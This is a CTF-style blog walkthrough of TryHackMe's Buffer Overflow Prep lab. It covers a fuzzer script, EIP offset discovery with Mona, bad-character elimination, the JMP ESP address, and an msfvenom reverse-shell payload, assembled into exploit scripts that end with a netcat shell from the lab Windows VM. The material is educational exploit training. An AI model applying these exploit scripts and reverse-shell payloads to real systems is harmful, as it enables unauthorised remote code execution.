---
title: "Walk-through of Buffer Overflow Prep from TryHackMe"
header:
  teaser: /assets/images/2021-03-14-15-46-39.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Buffer Overflow
  - Immunity
  - Mona
  - 
---

## Machine Information

![bofprep](/assets/images/2021-03-14-15-46-39.png)

Buffer Overflow Prep is rated as an easy difficulty room on TryHackMe. It uses a vulnerable 32bit Windows binary to help teach you basic stack based buffer overflow techniques. This room can be used as prep for taking the OCSP exam, where you will need to use similar methods. It's also a great resource if you want to get started on learning how to exploit buffer overflows. The vulnerable file has ten different vulnerabilities, and you'll use the same technique for each so I just run through it twice.

<!--more-->
Skills required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit. We also learn a little about Immunity Debugger and Mona for Windows.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) |
| Machine Release Date | 8th August 2020 |
| Date I Completed It | 14th March 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Task 1 - Environment Prep

In this initial task [Tib3rius](https://twitter.com/0xTib3rius) explains about the Win7 VM that you can use. He also points you to a helpful buffer overflow [cheatsheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst) if you need help with the basics.

Hopefully I'll be explaining things in enough detail for you to get the hang of doing basic stack based buffer overflows. There are also lots of great resources out there on the internet, including more rooms on TryHackMe as well.

To make it easier I'm going to pull the vulnerable file we'll be working with over to my own 32bit Win7 VM. First start an SMB server on Kali using Impacket:

```text
root@kali:/home/kali/thm/bofprep# python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /home/kali/thm/bofprep
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then in another terminal use rdesktop to connect to the Room VM:

```text
kali@kali:~$ rdesktop 10.10.82.190
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
```

Now from the VM copy the OCSP folder over to my share on Kali:

![bofprep-smbshare](/assets/images/2021-03-07-17-20-40.png)

This room will take a fair amount of time to get through all ten challenges. So now I won't need the THM VM again, and it saves me having to keep deploying it.

I already have a VM with Python, Immunity and Mona set up from when I did the [Brainstorm](https://pencer.io/ctf/ctf-thm-brainstorm/) room. So I can just fire that up and pull the files across to work on them from there. If you haven't got your own VM to use, then you can either deploy the one provided in the room which is ready to go, or simply install the software yourself on a VM of choice:

Get Immunity Debugger from [here](https://www.immunityinc.com/products/debugger/), you'll need to register to get it although there is no check on the email address you use.

Get the Mona python script from [here](https://github.com/corelan/mona). You'll need to copy the mona.py file in to the PyCommands folder in the Immunity install before you can use it.

When you have your environment ready we can copy the challenge files across to it from Kali. First start a webserver:

```text
root@kali:/home/kali/thm/bofprep# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then browse to it from our Win7 VM and copy the ocsp.exe file across:

![bofprep-webserver](/assets/images/2021-03-08-21-52-29.png)

Now we can get started.

## Task 2 - Overflow 1

On your Win7 machine right click Immunity and start as Administrator. Then from the menu select File - Open, or press F3, and select the ocsp.exe file:

![bofprep-ocsp.exe](/assets/images/2021-03-08-22-12-00.png)

Click Open, then you'll be at the main Immunity screen with a few windows already filled with information. By default the file you opened will be paused. From the menu select Debug - Run, or press F9:

![bofprep-immunity](/assets/images/2021-03-08-22-10-00.png)

You'll see in the bottom right it now says Running, also a command window will have opened in the background where you can see the ocsp.exe is running and waiting for a connection on port 1337:

![bofprep-ocsp-running](/assets/images/2021-03-08-22-15-51.png)

Switch to Kali and connect to the application running on Win7 with netcat:

```text
root@kali:/home/kali/thm/bofprep# nc 192.168.0.11 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
```

Let's do as instructed and type help:

```text
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
```

Following the guidance on the room we type "OVERFLOW1 test", then terminate the connection:

```text
OVERFLOW1 test
OVERFLOW1 COMPLETE
^C
```

Now if we go back to Win7 and look at the window that has ocsp.exe running in it we see our connection and subsequent disconnect:

![bofprep-overflow1](/assets/images/2021-03-08-22-23-06.png)

### Mona Config

We'll be using Mona for much of this challenge, so it's worth setting the working directory as advised:

![bofprep-mona-workingdir](/assets/images/2021-03-08-22-25-36.png)

We know this challenge is based on a vulnerable exe, where we are doing a simple stack based buffer overflow to exploit it. We can check to see if any protections are in place using Mona:

```text
!mona modules
```

![bofprep-modules](/assets/images/2021-03-10-22-00-59.png)

We can see ocsp.exe and essfunc.dll both say False against Rebase, SafeSEH, ASLR etc. If they had True against any our job would be much harder!

### Python Fuzzer Script

Knowing this will be a fairly simple challenge we may as well use the supplied Python code and create fuzzer.py with it:

```text
import socket, time, sys

ip = "192.168.0.11"
port = 1337
timeout = 5

buffer = []  
counter = 100    
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Here I've just changed IP to be the current one of my Win7 VM where the ocsp.exe file is running. Now run the script and wait:

```text
root@kali:/home/kali/thm/bofprep# python fuzzer.py 
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Could not connect to 192.168.0.11:1337
```

Here we see the script first sent 100 bytes, in actual fact it was 100 letter A's, and then it repeated increasing by 100 at a time until there wasn't a response at 2000 bytes sent. At this point the ocsp app has crashed on our Win7 VM. Before you can do the next steps go to Immunity, then from the Debug menu chose Close. Now open ocsp.exe again from within Immunity, don't forget it will start Paused so press F9 to start it running.

### Mona Unique Pattern

Next we need to find the exact number of bytes that caused the overflow, so back to Immunity and use Mona to create a unique pattern:

```text
!mona pattern_create 2000
```

![bofprep-mona-create](/assets/images/2021-03-08-22-49-02.png)

Open the text file Mona created from our working directory:

![bofprep-mona-pattern](/assets/images/2021-03-08-22-47-15.png)

Copy the ASCII string. Create an exploit script using the Python code provided, and paste our string in to it:

```text
import socket

ip = "192.168.0.11"
port = 1337

prefix = "OVERFLOW1 "
offset = 0 
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3A"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Above I've just set the IP to my Win7 VM running the ocsp.exe, and I've pasted my 2000 byte payload from Mona in to the payload variable.

### Pyhton Exploit Script

Now we can run the script:

```text
root@kali:/home/kali/thm/bofprep# python exploit.py 
Sending evil buffer...
Done!
```

Back to Immunity, and use Mona to find the number of bytes that caused the crash:

```text
!mona findmsp -distance 2000
```

![bofprep-findmsp](/assets/images/2021-03-08-23-00-23.png)

Check the text file Mona created from our working directory:

![bofprep-eipoffset](/assets/images/2021-03-08-23-02-27.png)

We are looking for the offset needed to get to the EIP (Extended Instruction Pointer), as that pointer contains the address of the next instruction that will be executed. We can see from the output that Mona has found the offset to be 1978. So now we go back to our exploit.py script and change the offset to 1978, we change the payload back to empty, and we set retn to BBBB:

```text
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""
```

### Controlling EIP

With this we want to check that we can fill EIP with our own bytes, in this test we will fill it with four B's.

Make sure you've closed ocsp.exe and started it again, now run our modified script on Kali, then come back to Immunity to see the program has crashed again. This time we are checking for those four B's on the EIP register:

![bofprep-registers](/assets/images/2021-03-09-22-15-13.png)

In ASCII a B is 42, so as we can see we have filled EIP with four of them.

At this point we have determined how many bytes we need to send to fill the buffer used by the ocsp.exe program. We've then confirmed that we control the EIP register and can fill it with an address of our choosing.

### Bad Characters

Next we need to check for characters that would be considered bad. This basically means if our payload contains characters that the program won't accept then it will fail to execute.

The process is simple enough. We create a payload that contains all ASCII characters in hex format, I used [this](https://github.com/cytopia/badchars) site to get the list. Note \x00 is missing, this is because that is always considered a bad character.

We use Mona to create a file, called bytearray.bin, that contains the same list of character first:

```text
!mona bytearray -b "\x00"
```

![bofprep-bytearray](/assets/images/2021-03-09-22-36-00.png)

Then we go to our exploit.py script and add them as a payload:

```text
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)  
 
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```

Close and restart ocsp.exe, make sure you run it in Immunity. Go to Kali and run the script then back to Immunity to look for bad chars. First find the value of the ESP register:

![bofprep-esp](/assets/images/2021-03-09-22-42-15.png)

Now use Mona to compare the contents of memory starting at the address in ESP with the bytearray.bin file we created earlier:

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 0175FA30
```

![bofprep-compare-esp](/assets/images/2021-03-09-22-44-55.png)

From the output we can see the comparison, and at the bottom it lists the possible bad chars. We just repeat this process removing each of the bad chars one at a time until we have no bad ones left. So start by removing 07, our payload is changed to this:

```text
payload = (
  "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

If you look at the first line you can see i've removed \x07. Now we repeat these steps again:

```text
1. On Kali save exploit.py with \x07 removed.
2. On Win7 in Immunity close ocsp.exe, then open it again and press F9 to start it running.
3. On Win7 in Immunity use Mona to create a new bytearray with \x07 removed.
4. On Kali run the exploit.py.
5. On Win7 in Immunity check value of ESP register.
6. On Win7 in Immunity use Mona to compare memory with byte array.
```

After we do all that for this run with \x07 removed we see this result:

![bofprep-compare-two](/assets/images/2021-03-09-22-56-53.png)

Repeat the above again, this time removing \x2e. We see this result:

![bofprep-compare-three](/assets/images/2021-03-09-23-04-24.png)

Repeat the above again, this time removing \xa0. We see this result:

![bofprep-compare-four](/assets/images/2021-03-09-23-07-39.png)

It's important we remove bad characters one at a time, as sometimes one bad character can affect the one following it. We can see this here were Mona thought a1 was possibly bad, but found to be ok once we'd removed a0.

### Finding ESP

Now we have our list of bad characters we have to find the address of the extended stack pointer or ESP. The ESP is the CPU register that holds the memory address of the top of the stack. After our script has completed and we've overwritten the buffer our payload will be hopefully lined up to ESP. With us controlling EIP, we can use it to jump the program flow to the address of ESP.

One other thing to know is that we can't always guarantee that our payload starts at the address ESP points to. It should be close, but it could be influenced by other factors, like the payload was encoded and it needs some space to decode. To ensure we hit the start of our payload we use a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide). We call this padding, and use \x90 as the opcode, which does nothing but cause the pointer to slide along them to the start of our payload. We'll add some of these in front of our payload in the script.

To find the ESP address in memory we look for JMP ESP, which we can think of as "Jump to the ESP register". We use Mona to find this, asking it to only return addresses that exclude our bad characters:

```text
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

![bofprep-rtn-esp](/assets/images/2021-03-10-21-38-23.png)

The first address is 0x625011af, we have to convert this to Little Endian format to use in our script:

```text
0x625011af <==> \xaf\x11\x50\x62
```

We’ll inject this return address into the EIP, instead of our four B's we used earlier. After overflowing the buffer and reaching the null terminator, it’ll look into the EIP for the address of the next instruction, where it will find the address of ESP. Following this will cause the program to jump back to the ESP, where it will find our payload, execute the code and give us command execution on the system.

Simple!

### MSFVenom Payload

Ok, so we are nearly there. Let's generate our payload using MSFVenom:

```text
root@kali:/home/kali/thm/bofprep# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=1234 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xd9\xf7\xd9\x74\x24\xf4\xbe\xd3\x57\x93\xea\x58"
payload += b"\x2b\xc9\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\xa3"
payload += b"\x44\x71\x1f\xbf\x83\xf7\xe0\x3f\x54\x98\x69\xda"
payload += b"\x65\x98\x0e\xaf\xd6\x28\x44\xfd\xda\xc3\x08\x15"
payload += b"\x68\xa1\x84\x1a\xd9\x0c\xf3\x15\xda\x3d\xc7\x34"
<SNIP>
payload += b"\x0c\xc6\xf4"
```

Note the LHOST and LPORT are for our Kali machine where we will have netcat waiting for the reverse shell to connect.

### Finish Exploit Script

Time to put our final script together:

```text
ip = "192.168.0.11"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload =  b""
payload += b"\xbe\xa6\xc1\xe7\x1b\xda\xcc\xd9\x74\x24\xf4\x58"
payload += b"\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e\x03\xd6"
payload += b"\xcf\x05\xee\xea\x38\x4b\x11\x12\xb9\x2c\x9b\xf7"
payload += b"\x88\x6c\xff\x7c\xba\x5c\x8b\xd0\x37\x16\xd9\xc0"
payload += b"\xcc\x5a\xf6\xe7\x65\xd0\x20\xc6\x76\x49\x10\x49"
payload += b"\xf5\x90\x45\xa9\xc4\x5a\x98\xa8\x01\x86\x51\xf8"
<SNIP>
```

Just to confirm what we have above:

```text
ip = IP address of Win7 running our ocsp.exe
port = port ocsp.exe is listening on
offset = number of bytes that will fill the buffer
overflow = will be letter A * offset
retn = address of the ESP
padding = NOP sled to ensure we hit our payload
payload = shellcode created by MSFVenom
```

### Reverse Shell

Make sure you've restarted ocsp.exe and set it running in Immunity. Now we can run the script on Kali:

```text
root@kali:/home/kali/thm/bofprep# python exploit.py 
Sending evil buffer...
Done!
```

Switch to our other console window on Kali where netcat is listening:

```text
kali@kali:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.19] from (UNKNOWN) [192.168.0.11] 49939
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>
```

We have our reverse shell connected, and can confirm our exploit worked.

I tried to explain that process is as much detail as possible, so hopefully it makes sense and you'll be able to do the next 9 challenges on your own!

Just to be sure I'll do one more with you, but just summarise the steps.

## Task 3 - Overflow 2

Here's the plan:

```text
1. Find how many characters we need to send to cause the buffer overflow.
2. Find which characters are considered bad.
3. Find address of ESP.
4. Create shellcode.
5. Assemble script, execute and get our reverse shell.
```

Ok, let's go. And make sure you remember to restart ocsp.exe on your Win7 VM each time between the steps.

First change fuzzer.py so it points to OVERFLOW2:

```text
s.recv(1024)
print("Fuzzing with %s bytes" % len(string))
s.send("OVERFLOW2 " + string + "\r\n")
s.recv(1024)
s.close()
```

Run and see where we crash the program:

```text
root@kali:/home/kali/thm/bofprep# python fuzzer.py 
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Could not connect to 192.168.0.11:1337
```

Create unique pattern with Mona for 800 characters:

```text
!mona pattern_create 800
```

Change exploit.py to point to OVERFLOW2 and use the unique pattern from Mona:

```text
prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5A<SNIP>y3Ay4Ay5Ay6Ay7Ay4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
postfix = ""
```

Run exploit.py against program again, use Mona to find the offset:

```text
!mona findmsp -distance 800
```

![bofprep-634-offset](/assets/images/2021-03-11-22-42-29.png)

Check we control EIP, change exploit.py with new offset and add BBBB:

```text
prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""
```

Run exploit.py again, check EIP for 424242:

![bofprep-BBBB-EIP](/assets/images/2021-03-11-22-44-56.png)

Use Mona to create a bytearray so we can look for bad characters:

```text
!mona bytearray -b "\x00"
```

Add our bad character array to exploit.py:

```text
prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  <SNIP>
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)  
```

Run exploit.py, then look in Immunity to check value of ESP:

![bofprep-634-ESP](/assets/images/2021-03-11-22-50-21.png)

Use Mona to check for bad characters:

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 0175FA30
```

Check output to see which ones we need to exclude:

![bofprep-compare-badchars](/assets/images/2021-03-11-22-53-58.png)

Repeat until we find all bad characters:

![bofprep-found-badchars](/assets/images/2021-03-11-22-57-50.png)

We have them all, now find JMP ESP:

```text
!mona jmp -r esp -cpb  "\x00\x23\x3c\x83\xba"
```

We find from this the address of ESP is 625011AF. Change to Little Endian:

```text
625011AF <==> \xaf\x11\x50\x62
```

Generate a new MSFVenom payload with the bad characters excluded:

```text
root@kali:/home/kali/thm/bofprep# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=1234 -b '\x00\x23\x3c\x83\xba' EXITFUNC=thread -f python -v payload
```

Now assemble final script:

```text
ip = "192.168.0.11"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload =  b""
payload += b"\xfc\xbb\x43\xca\x8c\x9f\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\xbf\x22\x0e\x9f\x3f\xb3\x6f\x29\xda\x82\xaf"
<SNIP>
```

Run exploit.py, switch to other console where we have netcat listening on port 1234:

```text
root@kali:/home/kali/thm/bofprep# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.19] from (UNKNOWN) [192.168.0.11] 49973
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>
```

We have our shell. OVERFLOW2 completed.

## Conclusion

For the remaining eight challenges you should be able to simply repeat the steps from above. By the time you've completed this room you really should be ready for your OCSP exam! Or just be really good at static buffer overflows. Either way this room is a great resource to help you improve you're skills.
